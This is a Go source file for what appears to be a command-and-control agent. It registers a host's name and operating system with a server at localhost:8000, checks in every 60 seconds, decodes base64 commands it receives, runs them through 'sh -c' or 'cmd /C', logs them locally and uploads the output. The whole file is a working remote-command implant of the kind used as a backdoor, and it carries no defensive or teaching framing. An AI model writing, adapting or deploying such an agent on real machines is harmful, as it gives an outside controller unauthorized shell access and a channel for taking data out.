package main

import (
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"

    "github.com/google/uuid"
)

const (
    serverURL       = "http://localhost:8000"
    registerURL     = serverURL + "/register"
    checkinURL      = serverURL + "/checkin"
    stopURL         = serverURL + "/stop_agent"
    uploadOutputURL = serverURL + "/upload_output"
    outputDir       = "output"
    manifestFile    = "agent_manifest.json"
)

type AgentInfo struct {
    UUID      string `json:"uuid"`
    OS        string `json:"os"`
    Timestamp int64  `json:"timestamp"`
    Hostname  string `json:"hostname"`
}

type Manifest struct {
    UUID           string `json:"uuid"`
    CheckinInterval int    `json:"checkin_interval"`
}

func main() {
    // Check if manifest file exists
    manifest, err := loadOrCreateManifest()
    if err != nil {
        fmt.Println("Error loading or creating manifest:", err)
        return
    }

    // Get OS information
    osInfo := getOSInfo()

    // Get hostname
    hostname, err := os.Hostname()
    if err != nil {
        fmt.Println("Error getting hostname:", err)
        return
    }

    // Register the agent with the server
    registerAgent(manifest.UUID, osInfo, hostname)

    // Start a periodic check-in loop
    for {
        checkinAgent(manifest.UUID)
        time.Sleep(time.Duration(manifest.CheckinInterval) * time.Second)
    }
}

func generateUUID() string {
    // Generate a new UUID
    id := uuid.New()
    return id.String()
}

func getOSInfo() string {
    return runtime.GOOS
}

func loadOrCreateManifest() (*Manifest, error) {
    if _, err := os.Stat(manifestFile); err == nil {
        // Manifest file exists, load it
        data, err := ioutil.ReadFile(manifestFile)
        if err != nil {
            return nil, fmt.Errorf("error reading manifest file: %w", err)
        }
        var manifest Manifest
        if err := json.Unmarshal(data, &manifest); err != nil {
            return nil, fmt.Errorf("error unmarshalling manifest file: %w", err)
        }
        return &manifest, nil
    }

    // Manifest file does not exist, create it
    manifest := &Manifest{
        UUID:           generateUUID(),
        CheckinInterval: 60, // Default check-in interval is 60 seconds
    }
    if err := saveManifest(manifest); err != nil {
        return nil, fmt.Errorf("error saving manifest file: %w", err)
    }
    return manifest, nil
}

func saveManifest(manifest *Manifest) error {
    data, err := json.Marshal(manifest)
    if err != nil {
        return fmt.Errorf("error marshalling manifest: %w", err)
    }
    if err := ioutil.WriteFile(manifestFile, data, 0644); err != nil {
        return fmt.Errorf("error writing manifest file: %w", err)
    }
    return nil
}

func registerAgent(uuid string, osInfo string, hostname string) {
    agentInfo := AgentInfo{
        UUID:      uuid,
        OS:        osInfo,
        Timestamp: time.Now().Unix(),
        Hostname:  hostname,
    }

    // Marshal agentInfo to JSON
    payload, err := json.Marshal(agentInfo)
    if err != nil {
        fmt.Println("Error marshalling JSON:", err)
        return
    }

    // Send POST request to register the agent
    resp, err := http.Post(registerURL, "application/json", bytes.NewBuffer(payload))
    if err != nil {
        fmt.Println("Error registering agent:", err)
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        fmt.Println("Failed to register agent. Status:", resp.Status)
        return
    }

    fmt.Println("Agent registered successfully.")
}

func checkinAgent(uuid string) {
    agentInfo := AgentInfo{
        UUID:      uuid,
        Timestamp: time.Now().Unix(),
    }

    payload, err := json.Marshal(agentInfo)
    if err != nil {
        fmt.Println("Error marshalling JSON:", err)
        return
    }

    resp, err := http.Post(checkinURL, "application/json", bytes.NewBuffer(payload))
    if err != nil {
        fmt.Println("Error sending request to check in agent:", err)
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        fmt.Println("Failed to check in agent. Status:", resp.Status)
        return
    }

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        fmt.Println("Error reading response body:", err)
        return
    }

    fmt.Printf("Agent ID %s checked in successfully.\n", uuid)

    if len(body) > 0 {
        var commands []string
        err := json.Unmarshal(body, &commands)
        if err != nil {
            fmt.Println("Error decoding commands:", err)
            return
        }

        for _, commandB64 := range commands {
            command, err := base64.StdEncoding.DecodeString(commandB64)
            if err != nil {
                fmt.Println("Error decoding command base64:", err)
                continue
            }

            fmt.Println("Received command from server:", string(command))
            output := executeCommand(string(command))
            writeOutputToFile(uuid, string(command), output)
            uploadOutput(uuid, output)
        }
    }
}

func executeCommand(command string) string {
    var cmd *exec.Cmd
    switch runtime.GOOS {
    case "windows":
        cmd = exec.Command("cmd", "/C", command)
    default:
        cmd = exec.Command("sh", "-c", command)
    }

    output, err := cmd.Output()
    if err != nil {
        fmt.Println("Error executing command:", err)
        return ""
    }

    outputB64 := base64.StdEncoding.EncodeToString(output)
    fmt.Printf("Executed command. Output: %s\n", outputB64)
    return outputB64
}

func writeOutputToFile(uuid string, command string, output string) {
    if _, err := os.Stat(outputDir); os.IsNotExist(err) {
        os.Mkdir(outputDir, 0755)
    }

    outputFilePath := fmt.Sprintf("%s/%s_%d.txt", outputDir, uuid, time.Now().Unix())
    err := ioutil.WriteFile(outputFilePath, []byte(fmt.Sprintf("Command: %s\nOutput: %s\n", command, output)), 0644)
    if err != nil {
        fmt.Println("Error writing output to file:", err)
        return
    }

    fmt.Println("Output written to file:", outputFilePath)
}

func uploadOutput(uuid string, output string) {
    uploadData := map[string]string{
        "uuid":   uuid,
        "output": output,
    }

    payload, err := json.Marshal(uploadData)
    if err != nil {
        fmt.Println("Error marshalling JSON:", err)
        return
    }

    resp, err := http.Post(uploadOutputURL, "application/json", bytes.NewBuffer(payload))
    if err != nil {
        fmt.Println("Error uploading output:", err)
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        fmt.Println("Failed to upload output. Status:", resp.Status)
        return
    }

    fmt.Println("Output uploaded successfully.")
}
